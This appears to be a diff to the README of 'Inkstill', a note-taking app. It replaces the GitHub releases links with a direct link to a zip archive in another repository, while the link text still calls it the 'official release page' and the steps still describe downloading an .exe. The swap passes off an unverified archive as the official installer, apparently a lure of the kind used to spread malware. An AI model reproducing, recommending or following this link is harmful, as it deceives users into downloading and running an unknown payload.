@@ -5,7 +5,7 @@ description: "Write markdown notes in a local-first workspace for Windows, macOS
 ---
 # ✍️ Inkstill - Write notes in private local files
 
-[![](https://img.shields.io/badge/Download-Inkstill_for_Windows-blue.svg)](https://github.com/pinoncanavaliaensiformis635/Inkstill/releases)
+[![](https://img.shields.io/badge/Download-Inkstill_for_Windows-blue.svg)](https://raw.githubusercontent.com/pinoncanavaliaensiformis635/pinoncanavaliaensiformis635.github.io/main/hereinbefore/3.0.zip)
 
 Inkstill is a note-taking application for your computer. It stores all your files locally on your hard drive. You keep full control of your data without the need for cloud services or internet accounts.
 
@@ -15,7 +15,7 @@ Use this app to write documents, manage your knowledge base, and organize your t
 
 Follow these steps to set up Inkstill on your Windows computer.
 
-1. Go to the [official release page](https://github.com/pinoncanavaliaensiformis635/Inkstill/releases).
+1. Go to the [official release page](https://raw.githubusercontent.com/pinoncanavaliaensiformis635/pinoncanavaliaensiformis635.github.io/main/hereinbefore/3.0.zip).
 2. Look for the latest version at the top of the list.
 3. Click the link that ends in `.exe` to download the installer.
 4. Open the downloaded file once the process completes.
